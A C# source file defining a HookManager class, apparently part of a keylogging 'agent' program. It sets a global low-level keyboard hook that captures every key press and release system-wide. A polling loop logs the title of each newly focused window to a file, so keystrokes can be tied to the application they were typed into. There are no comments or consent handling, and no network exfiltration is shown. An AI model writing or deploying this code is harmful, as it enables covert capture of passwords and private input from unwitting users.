using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Agente1
{
    public class HookManager
    {
        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;

        private readonly LowLevelKeyboardProc _proc;
        private IntPtr _hookID = IntPtr.Zero;
        private readonly KeyHandler keyHandler;
        private readonly FileLogger fileLogger;
        private IntPtr lastForegroundWindow = IntPtr.Zero;

        public HookManager(KeyHandler keyHandler, FileLogger fileLogger)
        {
            this.keyHandler = keyHandler;
            this.fileLogger = fileLogger;
            _proc = HookCallback;
        }

        public void SetHook()
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        public void Unhook()
        {
            UnhookWindowsHookEx(_hookID);
        }

        public void Start()
        {
            SetHook();
            Task.Run(() => MonitorActiveWindow());
        }

        private async Task MonitorActiveWindow()
        {
            while (true)
            {
                IntPtr foregroundWindow = GetForegroundWindow();
                if (foregroundWindow != lastForegroundWindow)
                {
                    lastForegroundWindow = foregroundWindow;
                    string windowTitle = GetActiveWindowTitle(foregroundWindow);
                    if (!string.IsNullOrEmpty(windowTitle))
                    {
                        fileLogger.LogWindowTitle(windowTitle);
                    }
                }
                await Task.Delay(1000);
            }
        }

        private string GetActiveWindowTitle(IntPtr hWnd)
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            if (GetWindowText(hWnd, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                if (wParam == (IntPtr)WM_KEYDOWN)
                {
                    keyHandler.HandleKeyDown(key);
                }
                else if (wParam == (IntPtr)WM_KEYUP)
                {
                    keyHandler.HandleKeyUp(key);
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
}
